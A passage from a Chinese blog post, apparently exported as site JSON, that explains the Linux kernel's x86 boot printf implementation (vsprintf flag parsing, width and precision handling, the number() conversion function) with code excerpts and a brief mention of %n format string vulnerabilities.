class=\"string\">'d'</span>:</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'i'</span>:</div><div class=\"line\">\t\t\tflags |= SIGN;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'u'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">default</span>:</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'%'</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (*fmt)</div><div class=\"line\">\t\t\t\t*str++ = *fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t\t--fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'l'</span>)</div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'h'</span>) &#123;</div><div class=\"line\">\t\t\tnum = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span>)va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (flags &amp; SIGN)</div><div class=\"line\">\t\t\t\tnum = (<span class=\"keyword\">short</span>)num;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (flags &amp; SIGN)</div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\tstr = number(str, num, base, field_width, precision, flags);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t*str = <span class=\"string\">'\\0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> str - buf;</div></pre></td></tr></table></figure></p>\n<h2 id=\"number函数\"><a href=\"#number函数\" class=\"headerlink\" title=\"number函数\"></a>number函数</h2><p>首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在<code>[]</code>里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时”返回”余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是<code>一切皆为文件</code>和<code>一切皆为表达式</code>.)<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __do_div(n, base) (&#123; \\</span></div><div class=\"line\">int __res; \\</div><div class=\"line\">__res = ((unsigned long) n) % (unsigned) base; \\</div><div class=\"line\">n = ((unsigned long) n) / (unsigned) base; \\</div><div class=\"line\">__res; &#125;)</div></pre></td></tr></table></figure></p>\n<p>再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.<code>static</code>类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.<code>char *</code>返回值表明能够实现链式功能,可对比<code>strcpy</code>函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个<code>num</code>是对%idp等格式化的栈参数的一个拷贝.第三个<code>base</code>顾名思义就是进制基数了.第四个<code>size</code>即为对齐宽度.第五个为精度,最后一个为标志位字段.<br>首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.<code>tmp[66]</code>我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为<code>long</code>的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32-&gt;第4位置位,使得可以很轻松地<code>或</code>运算实现大写字符-&gt;小写字符(ascll码相差32).如果<code>0</code>和<code>-</code>同时置位,gcc编译器会提示<code>warning: &#39;0&#39; flag ignored with &#39;-&#39; flag in gnu_printf format [-Wformat=]</code>,表明会忽略掉<code>0</code>的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的<code>&amp;= ~</code>运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除<code>补零</code>标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符<code>c</code>也是用来填充的,为<code>0</code>或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据<code>size</code>和置位<code>sign</code>.之后判断16进制和8进制情况,16进制的<code>size</code>减2是由于要填充<code>0x</code>或者<code>0X</code>,8进制只需要填充<code>0</code>即可.之后就开始进制转换成字符了,并根据<code>locase</code>的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的<code>precision</code>表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果<code>ZEROPAD</code>和<code>LEFT</code>都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据<code>size</code>的剩余大小继续填充<code>c</code>,后面就根据i的情况填充了,直到满足<code>size</code>这个宽度域为0.最后返回<code>str</code>的首地址.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">char</span> *<span class=\"title\">number</span><span class=\"params\">(<span class=\"keyword\">char</span> *str, <span class=\"keyword\">long</span> num, <span class=\"keyword\">int</span> base, <span class=\"keyword\">int</span> size, <span class=\"keyword\">int</span> precision,</span></span></div><div class=\"line\">\t\t    <span class=\"keyword\">int</span> type)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"comment\">/* we are called with base 8, 10 or 16, only, thus don't need \"G...\"  */</span></div><div class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> digits[<span class=\"number\">16</span>] = <span class=\"string\">\"0123456789ABCDEF\"</span>; <span class=\"comment\">/* \"GHIJKLMNOPQRSTUVWXYZ\"; */</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">char</span> tmp[<span class=\"number\">66</span>];</div><div class=\"line\">\t<span class=\"keyword\">char</span> c, sign, locase;</div><div class=\"line\">\t<span class=\"keyword\">int</span> i;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* locase = 0 or 0x20. ORing digits or letters with 'locase'</span></div><div class=\"line\">\t * produces same digits or (maybe lowercased) letters */</div><div class=\"line\">\tlocase = (type &amp; SMALL);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; LEFT)</div><div class=\"line\">\t\ttype &amp;= ~ZEROPAD;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (base &lt; <span class=\"number\">2</span> || base &gt; <span class=\"number\">16</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</div><div class=\"line\">\tc = (type &amp; ZEROPAD) ? <span class=\"string\">'0'</span> : <span class=\"string\">' '</span>;</div><div class=\"line\">\tsign = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SIGN) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (num &lt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">'-'</span>;</div><div class=\"line\">\t\t\tnum = -num;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (type &amp; PLUS) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">'+'</span>;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (type &amp; SPACE) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SPECIAL) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (base == <span class=\"number\">16</span>)</div><div class=\"line\">\t\t\tsize -= <span class=\"number\">2</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (base == <span class=\"number\">8</span>)</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\ti = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>)</div><div class=\"line\">\t\ttmp[i++] = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (num != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\ttmp[i++] = (digits[<span class=\"number\">__</span>do_div(num, base)] | locase);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (i &gt; precision)</div><div class=\"line\">\t\tprecision = i;</div><div class=\"line\">\tsize -= precision;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!(type &amp; (ZEROPAD + LEFT)))</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (sign)</div><div class=\"line\">\t\t*str++ = sign;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SPECIAL) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (base == <span class=\"number\">8</span>)</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (base == <span class=\"number\">16</span>) &#123;</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t\t\t*str++ = (<span class=\"string\">'X'</span> | locase);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!(type &amp; LEFT))</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t*str++ = c;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i &lt; precision--)</div><div class=\"line\">\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t*str++ = tmp[i];</div><div class=\"line\">\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> str;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"puts\"><a href=\"#puts\" class=\"headerlink\" title=\"puts\"></a>puts</h2><p>至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到<code>格式化字符串漏洞</code>参考看雪论坛这篇<a href=\"http://bbs.pediy.com/showthread.php?t=213153\" target=\"_blank\" rel=\"external\">文章</a>,如果没注册看不了的话先<a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458279936&amp;idx=1&amp;sn=2eb47265a0d170c45403d4b5d9097549&amp;chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&amp;scene=0#wechat_redirect\" target=\"_blank\" rel=\"external\">戳这里吧</a></p>\n","excerpt":"","more":"<blockquote>\n<p>printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.</p>\n</blockquote>\n<p>参考资料:<br><a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c\">Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c</a></p>\n<h2 id=\"printf大体\"><a href=\"#printf大体\" class=\"headerlink\" title=\"printf大体\"></a>printf大体</h2><p>首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下…大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.<br><img src=\"/images/printf.png\" alt=\"printf\"></p>\n<h2 id=\"va-系类宏\"><a href=\"#va-系类宏\" class=\"headerlink\" title=\"va_系类宏\"></a>va_系类宏</h2><p>然后我们利用sublime的插件来jump到<code>va_list</code>的定义,发现是一个char*的typedef.干脆就一起来认识一下<code>va_</code>系列的宏.</p>\n<p><code>acpi_native_int</code>也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.<code>_AUPBND</code>和<code>_ADNBND</code>两个宏的值一样.而<code>_bnd</code>这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.<code>va_start(ap, A)</code>这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而<code>va_arg(ap, T)</code>目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.<code>va_end(ap)</code>仅仅为了保证安全而象征性地将ap指向NULL.<br><img src=\"/images/va_arg.png\" alt=\"va_arg\"></p>\n<h2 id=\"vsprintf\"><a href=\"#vsprintf\" class=\"headerlink\" title=\"vsprintf\"></a>vsprintf</h2><p>vsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)<br><img src=\"/images/vsprintf.png\" alt=\"vsprintf\"><br>在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ZEROPAD\t1\t\t<span class=\"comment\">/* pad with zero */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SIGN\t2\t\t<span class=\"comment\">/* unsigned/signed long */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> PLUS\t4\t\t<span class=\"comment\">/* show plus */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SPACE\t8\t\t<span class=\"comment\">/* space if plus */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LEFT\t16\t\t<span class=\"comment\">/* left justified */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SMALL\t32\t\t<span class=\"comment\">/* Must be 32 == 0x20 */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SPECIAL\t64\t\t<span class=\"comment\">/* 0x */</span></span></div><div class=\"line\"><span class=\"comment\">/* process flags */</span></div><div class=\"line\">\t\tflags = <span class=\"number\">0</span>;</div><div class=\"line\">\t      repeat:</div><div class=\"line\">\t\t++fmt;\t\t<span class=\"comment\">/* this also skips first '%' */</span></div><div class=\"line\">\t\t<span class=\"keyword\">switch</span> (*fmt) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'-'</span>:</div><div class=\"line\">\t\t\tflags |= LEFT;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'+'</span>:</div><div class=\"line\">\t\t\tflags |= PLUS;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">' '</span>:</div><div class=\"line\">\t\t\tflags |= SPACE;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'#'</span>:</div><div class=\"line\">\t\t\tflags |= SPECIAL;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'0'</span>:</div><div class=\"line\">\t\t\tflags |= ZEROPAD;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure></p>\n<p>某些字段就不说了,用过printf的应该都知道的,其中的<code>#</code>作用就是方便16进制和8进制的格式化,例如<code>%#x</code>就会被默认加上<code>0x</code>,而<code>%#o</code>就会被默认加上<code>0</code>,具体可以看后面number函数实现就知道了.  </p>\n<hr>\n<blockquote>\n<p>找工作太忙了,今天才得有空继续分析^~^(2016.10.17) </p>\n</blockquote>\n<hr>\n<p>接下来就会去获得宽度字段,利用<code>isdigital</code>函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用<code>*</code>代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* get field width */</span></div><div class=\"line\">\t\tfield_width = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">isdigit</span>(*fmt))</div><div class=\"line\">\t\t\tfield_width = skip_atoi(&amp;fmt);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'*'</span>) &#123;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t\t<span class=\"comment\">/* it's the next argument */</span></div><div class=\"line\">\t\t\tfield_width = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (field_width &lt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t\t\t\tfield_width = -field_width;</div><div class=\"line\">\t\t\t\tflags |= LEFT;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure>\n<p>再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有<code>.</code>字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有<code>l</code>,<code>L</code>,<code>h</code>跟在后面的将使得<code>qualifier</code>被置为其ascll码值.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* get the precision */</span></div><div class=\"line\">\t\tprecision = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'.'</span>) &#123;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">isdigit</span>(*fmt))</div><div class=\"line\">\t\t\t\tprecision = skip_atoi(&amp;fmt);</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'*'</span>) &#123;</div><div class=\"line\">\t\t\t\t++fmt;</div><div class=\"line\">\t\t\t\t<span class=\"comment\">/* it's the next argument */</span></div><div class=\"line\">\t\t\t\tprecision = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (precision &lt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\tprecision = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"comment\">/* get the conversion qualifier */</span></div><div class=\"line\">\t\tqualifier = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'h'</span> || *fmt == <span class=\"string\">'l'</span> || *fmt == <span class=\"string\">'L'</span>) &#123;</div><div class=\"line\">\t\t\tqualifier = *fmt;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure></p>\n<p>之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以<code>int</code>类型为地址单元取得参数的值直接强制转化为<code>unsigned char</code>类型的字符.为什么呢?详情参考我的另外一篇<a href=\"http://www.rutk1t0r.cn/2016/08/21/memory-align/\">文章</a>,我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的<code>strnlen</code>函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,<code>if</code>和<code>while</code>没有加<code>{}</code>可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成<code>任意地址读写任意数据</code>的格式化字符串漏洞.<br>之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是<code>continue</code>,意思是直接跳转到最外面的<code>for</code>循环进行下一个字符的匹配,而%xXdiu后面接的是<code>break</code>,表示退出<code>switch</code>,转而进行后面的<code>h,L,l</code>的长类型的处理去了.还要注意在<code>switch case break</code>的结构中,如果<code>case</code>了第一个条件,之后如果没有遇到<code>break</code>,程序的控制流程将忽略后面的<code>case</code>条件,直接执行语句部分,直到遇见结束的<code>break</code>.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* default base */</span></div><div class=\"line\">\t\tbase = <span 